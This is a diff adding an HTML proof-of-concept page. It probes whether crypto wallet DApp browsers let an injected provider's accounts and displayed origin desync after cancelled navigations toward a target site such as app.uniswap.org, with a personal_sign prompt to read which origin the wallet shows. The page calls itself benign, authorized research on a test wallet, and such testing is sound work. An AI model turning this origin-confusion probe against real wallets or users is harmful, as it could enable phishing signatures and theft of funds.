@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DApp</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ button{font-size:14px;padding:11px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:5px 0}
+ input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
+ .warn{color:#b23;font-size:11px}
+</style>
+</head>
+<body>
+<h1>Wallet DApp-browser bridge-desync probe (benign)</h1>
+<p style="font-size:12px;color:#666">Authorized research. Open inside a crypto wallet's in-app DApp
+browser (MetaMask/Trust/Coinbase/etc.), using a TEST wallet (testnet, no real funds). Connect, then
+trigger a canceling navigation to a target origin; watch whether the injected provider's
+accounts/origin desync to the target. Benign — observes accountsChanged + selectedAddress; signing
+is only to READ which origin the wallet shows (reject the prompt).</p>
+
+<h2>provider</h2><pre id="env"></pre>
+<input id="target" value="https://app.uniswap.org">
+<button onclick="connect()">1 · connect (eth_requestAccounts) as THIS origin</button>
+<h2>cancel-navigation variants (content should stay here)</h2>
+<button onclick="nav('port0')">2a · navigate to target:0 (invalid port → cancels)</button>
+<button onclick="nav('p81')">2b · navigate to target:81 (likely hangs/cancels)</button>
+<button onclick="nav('download')">2c · navigate to a download response</button>
+<button onclick="nav('204')">2d · navigate to a 204 endpoint</button>
+<h2>re-check after cancel</h2>
+<button onclick="recheck()">3 · re-read accounts / selectedAddress</button>
+<button onclick="signProbe()">4 · personal_sign — READ the origin the wallet shows, then REJECT</button>
+
+<h2>log</h2><pre id="log"></pre>
+<p class="warn">Test wallet only (no real funds). Reject any signature prompt — we only read the shown origin.</p>
+
+<script>
+function g(id){return document.getElementById(id);}
+var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
+var eth=window.ethereum;
+function target(){return (g('target').value||'https://app.uniswap.org').trim();}
+function host(){try{return target().replace(/^https?:\/\//,'').replace(/\/.*$/,'');}catch(e){return 'app.uniswap.org';}}
+
+g('env').textContent = 'ethereum='+(typeof eth)+(eth?('\n isMetaMask='+eth.isMetaMask+' isTrust='+eth.isTrust+' selectedAddress='+eth.selectedAddress+'\n chainId='+eth.chainId+'\n origin(page)='+lo
+cation.origin):'  (no injected provider — open in a wallet DApp browser)');
+
+if(eth && eth.on){
+  eth.on('accountsChanged', function(a){ log('EVENT accountsChanged: '+JSON.stringify(a)+'  (page origin still '+location.origin+')'); });
+  eth.on('chainChanged', function(c){ log('EVENT chainChanged: '+c); });
+}
+
+async function connect(){
+  if(!eth){log('no provider');return;}
+  try{ var a=await eth.request({method:'eth_requestAccounts'}); log('connected as '+location.origin+' accounts='+JSON.stringify(a)); }
+  catch(e){ log('connect err '+(e&&e.message||e)); }
+}
+
+function nav(kind){
+  var h=host(), url;
+  if(kind==='port0') url='https://'+h+':0/';
+  else if(kind==='p81') url='https://'+h+':81/';
+  else if(kind==='download') url='data:application/octet-stream,desync';
+  else if(kind==='204') url='https://'+h+'/generate_204'; // may not be 204 on all hosts; use any known 204 you control
+  log('navigating (should CANCEL, page stays): '+url);
+  setTimeout(function(){ try{ location.href=url; }catch(e){ log('nav err '+e); } }, 200);
+}
+
+async function recheck(){
+  if(!eth){log('no provider');return;}
+  log('--- recheck after cancel ---');
+  log('selectedAddress = '+eth.selectedAddress);
+  try{ var a=await eth.request({method:'eth_accounts'}); log('eth_accounts = '+JSON.stringify(a)+'  (if these became the TARGET site\'s permitted accounts while page is still '+location.origin+' =
+DESYNC)'); }catch(e){ log('eth_accounts err '+(e&&e.message||e)); }
+}
+
+async function signProbe(){
+  if(!eth){log('no provider');return;}
+  try{
+    var acc = eth.selectedAddress || (await eth.request({method:'eth_accounts'}))[0];
+    log('requesting personal_sign — LOOK at the wallet prompt: which ORIGIN does it show? (attacker='+location.origin+' vs target='+target()+')');
+    await eth.request({method:'personal_sign', params:['bridge-desync-origin-check', acc]});
+    log('(you signed — but the test was the ORIGIN shown; reject next time)');
+  }catch(e){ log('sign rejected/err: '+(e&&e.message||e)+'  (good — we only needed to read the shown origin)'); }
+}
+</script>
+</body>
+</html>
